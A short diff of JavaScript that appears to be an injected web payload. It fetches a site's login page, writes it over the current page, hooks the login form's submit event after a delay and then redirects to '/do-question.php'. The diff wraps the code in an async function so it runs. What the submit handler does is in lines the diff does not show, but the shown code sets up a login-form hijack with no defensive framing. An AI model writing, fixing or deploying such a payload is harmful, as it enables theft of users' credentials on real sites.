@@ -1,3 +1,4 @@
+(async() =>
 document.write(await fetch('/login.php').then(r => r.text()) + `
   <script>
   setTimeout(() => $('form[action*=login]').submit(e => {
@@ -7,4 +8,4 @@ document.write(await fetch('/login.php').then(r => r.text()) + `
     setTimeout(() => window.location = '/do-question.php?aaid=10972720', 1000)
   }), 4000)
   </script>
-`)
+`))()
